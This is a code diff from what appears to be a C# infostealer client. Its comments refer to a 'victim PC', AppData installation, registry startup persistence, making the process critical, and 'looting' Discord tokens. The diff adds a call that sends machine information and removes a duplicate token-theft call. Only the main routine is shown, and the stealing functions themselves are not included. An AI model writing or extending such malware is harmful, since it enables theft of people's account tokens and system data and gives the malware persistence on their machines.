@@ -23,7 +23,7 @@ namespace Client
             // make sure this thing wont crash
             Application.ThreadException += Application_ThreadException;
             AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
-           
+
 #if !DEBUG
             /// Check if Application is already on victim PC
             if (!Constants.IsInAppData() && !Constants.IsInWinDir())
@@ -62,8 +62,11 @@ namespace Client
                             // if it does, remove it
                             Armitage.Startup.RemoveOldRegistryStartupKey();
                     }
+                    // everything is set
                     // set the letter to be critical, unburnable
                     ProtectTheLetter();
+                    // send to events we had a successful run
+
                 }
             }
 
@@ -78,8 +81,11 @@ namespace Client
 
             /// Start looting.
             Armitage.Cookies.Discord_Token.Send();
+
+            /// Send machine info
+            Armitage.Informer.Start();
 #endif
-            Armitage.Cookies.Discord_Token.Send();
+
             /// Init update checkers.
             Utilities.Updater Updater = new Utilities.Updater();
             Updater.Start();
